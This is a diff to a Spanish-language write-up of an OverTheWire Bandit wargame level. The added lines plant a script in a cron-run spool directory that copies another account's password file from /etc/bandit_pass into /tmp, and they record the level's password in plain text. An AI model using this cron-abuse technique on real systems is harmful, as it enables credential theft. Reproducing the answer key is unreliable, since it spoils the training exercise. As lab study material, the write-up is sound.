@@ -5,8 +5,21 @@ A program is running automatically at regular intervals from **cron**, the time
 **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 ## Comandos
 ```
+cd /var/spool/bandit24/foo
+
+cat << 'EOF' > myscript.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/b24_pass
+EOF
+chmod +x myscript.sh
+
+#esperar 1 o 2 minutos
+cat /tmp/b24_pass
 
 ```
-
+- chmod
+- shebang y rutas absolutas
+- cron jobs
+- shell scripting
 ## Contraseña    
-- 
+- gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
